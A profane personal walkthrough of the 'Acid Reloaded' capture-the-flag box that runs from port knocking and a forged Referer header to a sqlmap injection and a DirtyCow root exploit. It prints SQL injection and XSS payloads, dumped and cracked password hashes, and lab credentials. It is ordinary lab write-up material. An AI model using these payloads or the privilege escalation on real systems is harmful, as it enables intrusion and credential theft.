@@ -1,0 +1,579 @@
+Acid_reloaded
+time taken: 5 hours
+
+nmap:
+
+Nmap scan report for ctf03.root-me.org (212.129.29.185)
+Host is up (0.14s latency).
+All 5001 scanned ports on ctf03.root-me.org (212.129.29.185) are closed
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: webcam|power-device|general purpose|router|media device
+Running (JUST GUESSING): AXIS embedded (96%), CAEN embedded (96%), GNU Hurd (96%), Linux 2.0.X|2.1.X|2.2.X (96%), Philips embedded (96%), Sony embedded (96%)
+OS CPE: cpe:/h:axis:2100_network_camera cpe:/o:gnu:hurd cpe:/o:linux:linux_kernel:2.0.33 cpe:/o:linux:linux_kernel:2.0.39 cpe:/o:linux:linux_kernel:2.1.24 cpe:/h:philips:hdr112 cpe:/h:sony:svr-2000 cpe:/o:linux:linux_kernel:2.2.13
+Aggressive OS guesses: AXIS 2100 Network Camera (96%), CAEN SY2527 high voltage power supply (96%), GNU Hurd 0.3 (96%), Linux 2.0.33 (96%), Linux 2.0.35 - 2.0.36 (96%), Linux 2.0.39 - 2.0.40 (embedded) (96%), FREESCO single-floppy router (Linux 2.0.39) (96%), StarDot NetCam SC webcam (Linux 2.0.39) (96%), TiVo series 1 (Sony SVR-2000 or Philips HDR112) (Linux 2.1.24-TiVo-2.5, PowerPC) (96%), Linux 2.2.13 (SuSE 6.3) (96%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.08 ms 10.0.2.2
+2   0.20 ms ctf03.root-me.org (212.129.29.185)
+
+
+what the fuck
+
+root@kali:~/ctf_shit/acid_reloaded# ssh www-data@ctf03.root-me.org
+
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+									-by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+
+
+knock me out...port knocking???
+
+root@kali:~/ctf_shit/acid_reloaded# nc ctf03.root-me.org 3
+ctf03.root-me.org [212.129.29.185] 3 (?) : Connection refused
+root@kali:~/ctf_shit/acid_reloaded# nc ctf03.root-me.org 2
+ctf03.root-me.org [212.129.29.185] 2 (?) : Connection refused
+root@kali:~/ctf_shit/acid_reloaded# nc ctf03.root-me.org 1
+
+and redo the nmap scan...
+Warning: 212.129.29.185 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf03.root-me.org (212.129.29.185)
+Host is up (0.12s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 cb:47:92:da:ea:b8:d3:82:16:22:0d:a5:5f:05:47:51 (DSA)
+|   2048 fd:93:9d:28:57:fb:ef:e0:8e:f1:93:66:03:67:35:50 (RSA)
+|_  256 a0:a6:52:fb:2c:32:b7:08:b4:ed:61:1d:2d:fa:c8:58 (ECDSA)
+33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+|_http-server-header: Apache/2.4.10 (Ubuntu)
+|_http-title: Acid-Reloaded
+Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (87%), HP 9100c Digital Sender printer (J3113A) (87%), GNU Hurd 0.3 (87%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (86%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (86%), Allied Telesyn AT-9006SX/SC switch (86%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.08 ms 10.0.2.2
+2   0.18 ms ctf03.root-me.org (212.129.29.185)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 474.89 seconds
+
+ok so that seemed to have opened port 33447
+
+which brings us to an image telling me to use my brain....
+
+try uniscan:
+
+
+===================================================================================================
+| Domain: http://ctf03.root-me.org:33447/
+| Server: Apache/2.4.10 (Ubuntu)
+| IP: 212.129.29.185
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org:33447/bin/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org:33447/index.html
+
+ok.... bin brings us to a login page with an ominous "click me" icon which does not seem to do anything
+along with the advice to "think logically"...
+
+viewing source shows me this:
+
+view-source:http://ctf03.root-me.org:33447/bin/js/forms.js
+
+a login form maintained by peredurable
+
+which leads me to find this online:
+
+https://github.com/peredurabefrog/phpSecureLogin/blob/master/README.md
+
+let's try the uname:password of test_user/test@example.com:6ZaxN2Vzm9NUJT2y
+
+nope that doesn't work....
+
+http://ctf03.root-me.org:33447/bin/error.php?err=HELLO
+
+can put whatever text i want in the err part..
+
+from https://github.com/peredurabefrog/phpSecureLogin/blob/master/includes/psl-config.php --> could be useful later
+define("HOST", "localhost"); 			// The host you want to connect to. 
+define("USER", "sec_user"); 			// The database username. 
+define("PASSWORD", "4Fa98xkHVd2XmnfK"); 	// The database password. 
+define("DATABASE", "secure_login");             // The database name.
+
+let's try dirb:
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Aug  3 00:06:41 2017
+URL_BASE: http://ctf03.root-me.org:33447/bin/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4620                                                          
+
+---- Scanning URL: http://ctf03.root-me.org:33447/bin/ ----
+==> DIRECTORY: http://ctf03.root-me.org:33447/bin/crack/                                                                                              
+==> DIRECTORY: http://ctf03.root-me.org:33447/bin/css/                                                                                                
+==> DIRECTORY: http://ctf03.root-me.org:33447/bin/includes/                                                                                           
++ http://ctf03.root-me.org:33447/bin/index.php (CODE:200|SIZE:1467)                                                                                   
+==> DIRECTORY: http://ctf03.root-me.org:33447/bin/js/                                                                                                 
+==> DIRECTORY: http://ctf03.root-me.org:33447/bin/styles/
+
+hmm.. dirsearch?
+ _|. _ _  _  _  _ _|_    v0.3.7
+(_||| _) (/_(_|| (_| )
+
+Extensions: php | Threads: 10 | Wordlist size: 5151
+
+Error Log: /root/dirsearch/logs/errors-17-08-03_01-04-40.log
+
+Target: http://ctf03.root-me.org:33447/bin
+
+[01:04:40] Starting: 
+[01:04:49] 200 -   17B  - /bin/.gitignore
+.
+.
+.
+[01:07:21] 200 -  675B  - /bin/dashboard.php
+[01:07:20] 301 -  335B  - /bin/crack  ->  http://ctf03.root-me.org:33447/bin/crack/
+[01:07:20] 301 -  333B  - /bin/css  ->  http://ctf03.root-me.org:33447/bin/css/
+[01:07:21] 200 -  675B  - /bin/dashboard.php
+[01:07:59] 301 -  338B  - /bin/includes  ->  http://ctf03.root-me.org:33447/bin/includes/
+[01:08:00] 403 -  308B  - /bin/includes/
+[01:08:02] 200 -    1KB - /bin/index.php
+[01:08:05] 200 -    1KB - /bin/index.php/login/
+[01:08:11] 301 -  332B  - /bin/js  ->  http://ctf03.root-me.org:33447/bin/js/
+[01:09:17] 301 -  336B  - /bin/styles  ->  http://ctf03.root-me.org:33447/bin/styles/
+
+
+this is the login form for /bin/:
+
+<form  action="includes/validation.php" method="post" name="login_form"> 			
+            	Email: <input type="text" placeholder="Email Address" name="email" maxlength="20" />
+            	Password: <input type="password" placeholder="Password" name="password" id="password"/>
+            	<input type="submit" value="Login" onclick="formhash(this.form, this.form.password);" /> 
+        	</form>
+
+going to validation throws an error...
+
+
+ok so:
+
+/bin/ --> validation.php --> dashboard.php (ideally)
+
+after much thought, adding a HTTP refer header with Tamper Data when viewing /bin/dashboard.php 
+of Referer=http://ctf03.root-me.org:33447/bin/includes/validation.php, I get in!
+
+brings us top http://ctf03.root-me.org:33447/bin/l33t_haxor.php
+
+in view-source, there is a hidden link to 
+"http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1":
+
+brings me to another page...
+
+"The hacker community may be small, but it possesses the skills that are driving the global economies of the future."
+
+i should fucking hope so, I put enough time into this shit.
+
+
+and 11 onward shows a blank page
+
+lol http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1%20or%201=1
+tells us "hackers detected"
+
+adding the tried and tested comma:
+
+http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1%27 -->
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax 
+to use near ''1'') ORDER BY Description ASC' at line 1
+
+sqlmap time:
+
+[00:42:05] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[00:42:06] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting attacks
+
+no shit
+
+aaaand nothing...that and the fact that i kept on getting "hacker detected!!" messages means
+there may be some sort of WAF/IDS operating
+...maybe try with tampers?
+
+ALL the tampers?
+
+root@kali:~/ctf_shit/acid_reloaded# sqlmap -u http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1 --dbms=mysql --dump-
+all --level=3 --tamper=between,space2dash,
+charencode,concat2concatws,space2comment,space2hash,
+space2morehash,space2mysqldash,space2plus,space2randomblank
+
+hehehehe
+
+
+let's try xsser too while that is working just for the hell of it:
+
+Mosquito(es) landed!
+
+
+===========================================================================
+[*] Final Results:
+===========================================================================
+
+- Injections: 2309
+- Failed: 2125
+- Sucessfull: 184
+- Accur: 7 %
+
+===========================================================================
+[*] List of possible XSS injections:
+===========================================================================
+
+[I] Target: http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1
+[+] Injection: http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1/">f85f820cb5a9608d1b367e741800af88
+[-] Method: xss
+[-] Browsers: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] 
+ -------------------------------------------------- 
+
+[I] Target: http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1
+[+] Injection: http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1/ [ None ]
+[!] Special: This injection looks like a Cross Site Referer Scripting
+[-] Method: xsr
+-------------------------------------------------- 
+
+(crashed)
+
+
+this is valid xss:
+http://ctf03.root-me.org:33447/bin/l33t_haxor.php?id=1/%22%3E%3Cscript%3Ealert%2842%29;%3C/script%3E
+
+back to sqlmap:
+SQLMAP WORKS! after 2 hours 
+
+[02:25:03] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:25:03] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting attacks
+[02:25:03] [INFO] testing for SQL injection on GET parameter 'id'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[02:25:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:25:08] [WARNING] reflective value(s) found and filtering out
+[02:25:10] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="be")
+[02:25:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:25:10] [INFO] GET parameter 'id' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
+[02:25:10] [INFO] testing 'MySQL inline queries'
+[02:25:10] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[02:25:10] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+[02:25:15] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[02:25:15] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[02:25:15] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[02:25:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[02:25:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[02:25:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[02:25:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
+[02:25:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[02:25:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[02:25:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[02:25:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[02:25:32] [INFO] target URL appears to have 2 columns in query
+[02:25:33] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1') AND 8522=8522 AND ('SYQK'='SYQK
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=1') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787071,(SELECT (ELT(4284=4284,1))),0x716b6b6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('UQSr'='UQSr
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1') AND SLEEP(5) AND ('xWcu'='xWcu
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-7632') UNION ALL SELECT NULL,CONCAT(0x7178787071,0x74754a4e476f7243517376734d6f7552714d6266707070675948594965755a644f59465941754551,0x716b6b6271)#
+---
+[02:25:38] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[02:25:38] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 14.10 or 15.04 (utopic or vivid)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.5
+[02:25:38] [INFO] sqlmap will dump entries of all tables from all databases now
+[02:25:38] [INFO] fetching database names
+[02:25:38] [INFO] the SQL query used returns 4 entries
+[02:25:38] [INFO] starting 4 threads
+[02:25:38] [INFO] retrieved: information_schema
+[02:25:38] [INFO] retrieved: mysql
+[02:25:39] [INFO] retrieved: secure_login
+[02:25:39] [INFO] retrieved: performance_schema
+[02:25:39] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, secure_login'
+[02:25:39] [INFO] the SQL query used returns 143 entries
+[02:25:39] [INFO] starting 5 threads
+[02:25:39] [INFO] retrieved: "information_schema","CHARACTER_SETS"
+[02:25:40] [INFO] retrieved: "information_schema","COLLATIONS"
+[02:25:40] [INFO] retrieved: "information_schema","COLUMNS"
+.
+. bunch of bullshit...
+.
+[02:25:49] [INFO] retrieved: "secure_login","UB3R/strcpy.exe"
+[02:25:49] [INFO] retrieved: "performance_schema","threads"
+[02:25:49] [INFO] retrieved: "performance_schema","users"
+[02:25:49] [INFO] retrieved: "secure_login","word"
+[02:25:50] [INFO] retrieved: "secure_login","login_attempts"
+[02:25:50] [INFO] retrieved: "secure_login","members"
+[02:25:50] [INFO] fetching columns for table 'UB3R/strcpy.exe' in database 'secure_login'
+[02:25:50] [INFO] the SQL query used returns 2 entries
+[02:25:50] [INFO] starting 2 threads
+[02:25:50] [INFO] retrieved: "id","int(11)"
+[02:25:50] [INFO] retrieved: "Name","varchar(29)"
+[02:25:50] [INFO] fetching entries for table 'UB3R/strcpy.exe' in database 'secure_login'
+[02:25:50] [INFO] fetching number of entries for table 'UB3R/strcpy.exe' in database 'secure_login'
+[02:25:50] [INFO] retrieved: 0
+[02:25:52] [WARNING] table 'UB3R/strcpy.exe' in database 'secure_login' appears to be empty
+
+what is this /UB3R/strcpy.exe??
+
+looks like a link, download it...
+
+gdb doesn't seem to like it. is it really an .exe??
+
+root@kali:~/ctf_shit/acid_reloaded# file strcpy.exe 
+strcpy.exe: PDF document, version 1.5
+
+hmm
+
+rename to .pdf...
+
+it's a picture of the Ancient Aliens guy saying "I don't know what the fuck is going on".
+you and me both brother. 
+
+let's look at the sqlmap output again:
+
+available databases [4]:                                                      
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] secure_login
+
+
+Database: secure_login                                                        
+[4 tables]
++-----------------+
+| UB3R/strcpy.exe |
+| login_attempts  |
+| members         |
+| word            |
++-----------------+
+
+mysql users and password hashes:
+
+root:*C585694D9A2AB16831EAB1361DEC1908BE17F739
+acid:*616B4539A8036DB2A22866D602041053E22D4D51
+debian-sys-maint:*97C926204D749AEFD0C330150D4CB3D7B5C57124
+
+run hashes through John the Ripper:
+
+root@kali:~/ctf_shit/acid_reloaded# john --format=mysql-sha1 heshes.txt 
+Using default input encoding: UTF-8
+Loaded 3 password hashes with no different salts (mysql-sha1, MySQL 4.1+ [SHA1 128/128 AVX 4x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mehak            (root)
+
+
+
+maybe useful later...back to the ".exe"
+
+strings on strcpy.pdf:
+
+.
+.
+.
+%%EOFRar!
+acid.txt
+You are at right track.
+Don't loose hope..
+Good Luck :-)
+Kind & Best Regards,
+Acid
+lol.jpg
+.
+.
+.
+
+the fuck? maybe this is actualy a rar file?
+
+root@kali:~/ctf_shit/acid_reloaded# cp strcpy.exe strcpy.rar
+
+unrar the file..
+
+contains the above text in acid.txt and a picture of a pokemon or something in lol.jpg
+
+this is getting weird...
+
+important strings in lol.jpg:
+
+.
+.
+.
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+.
+.
+.
+Avinash.contact
+.
+.
+hint.txt
+`You have found a contact. Now, go and grab the details :-)
+.
+.
+.
+
+hmm...
+
+rar the picture again, and then two files come out:
+hint.txt, with the above text and Avinash.contact, which is this:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-
+instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P" xmlns:MSWABMAPI="http://schemas.microsoft.com/
+Contact/Extended/MSWABMAPI">
+	<c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate><c:Extended><MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/
+x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F></c:Extended>
+	<c:ContactIDCollection><c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e"><c:Value>0bcf610e-
+a7be-4f26-9042-d6b3c22c9863</c:Value></c:ContactID></c:ContactIDCollection><c:EmailAddressCollection><c:EmailAddress 
+c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e"><c:Type>SMTP</c:Type><c:Address>acid.exploit@gmail.com</
+c:Address><c:LabelCollection><c:Label>Preferred</c:Label></c:LabelCollection></c:EmailAddress><c:EmailAddress 
+c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true"/></c:EmailAddressCollection><c:NameCollection><c:Name 
+c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2"><c:FormattedName>Avinash</c:FormattedName><c:GivenName>Avinash</
+c:GivenName></c:Name></c:NameCollection><c:PersonCollection><c:Person c:ElementID="865f9eda-796e-451a-92b1-
+bf8ee2172134"><c:FormattedName>Makke</c:FormattedName><c:LabelCollection><c:Label>wab:Spouse</c:Label></c:LabelCollection></
+c:Person></c:PersonCollection><c:PhotoCollection><c:Photo c:ElementID="2fb5b981-cec1-45d0-
+ae61-7c340cfb3d72"><c:LabelCollection><c:Label>UserTile</c:Label></c:LabelCollection></c:Photo></c:PhotoCollection></
+c:contact>
+
+
+base64 decode AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=
+
+
+������N�o�o�B�@�1�2�3��� --> NooB@123
+
+ssh creds???
+
+i also see the string "Makke" in there.. try makke:NooB@123
+
+it works!
+
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+									-by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+                                                                              
+makke@ctf03.root-me.org's password: 
+Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+172 packages can be updated.
+132 updates are security updates.
+
+Last login: Mon Aug 24 21:25:34 2015 from 192.168.88.236
+makke@acid:~$ id
+uid=1001(makke) gid=1001(makke) groups=1001(makke)
+makke@acid:~$ ls -al
+total 32
+drwxr-xr-x 3 makke makke 4096 Aug 24  2015 .
+drwxr-xr-x 4 root  root  4096 Aug 24  2015 ..
+-rw------- 1 makke makke  205 Aug 24  2015 .bash_history
+-rw-r--r-- 1 makke makke  220 Aug 24  2015 .bash_logout
+-rw-r--r-- 1 makke makke 3760 Aug 24  2015 .bashrc
+drwx------ 2 makke makke 4096 Aug 24  2015 .cache
+-rw-rw-r-- 1 makke makke   40 Aug 24  2015 .hint
+-rw-r--r-- 1 makke makke  675 Aug 24  2015 .profile
+makke@acid:~$ cat .hint
+Run the executable to own kingdom :-)
+
+ok fuck this. Lord knows how insane this privesc will be.
+let's try to find an easier way to root.
+ 
+let's try a 32 bit dirtyc0w exploit...seeing as how we have no curl, or no wget (?????), 
+we'll give scp a shot to transfer the exploit over:
+
+on attacker:
+
+root@kali:~/ctf_shit/acid_reloaded# scp exp.c makke@ctf03.root-me.org:/tmp/
+Warning: the ECDSA host key for 'ctf03.root-me.org' differs from the key for the IP address '212.129.29.185'
+Offending key for IP in /root/.ssh/known_hosts:15
+Matching host key in /root/.ssh/known_hosts:26
+Are you sure you want to continue connecting (yes/no)? yes
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+									-by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+                                                                              
+makke@ctf03.root-me.org's password: 
+exp.c                                         100% 4880    12.9KB/s   00:00  
+
+and on target:
+
+makke@acid:/tmp$ ls
+exp.c
+systemd-private-da3e213701af484ab358214699ca9ab6-rtkit-daemon.service-VJQr8x
+vmware-root
+makke@acid:/tmp$ ./exp
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 49644
+Racing, this may take a while..
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+thread stopped
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
+root@acid:/tmp# id
+uid=0(root) gid=1001(makke) groups=1001(makke)
+
+
+hahaha. 
+
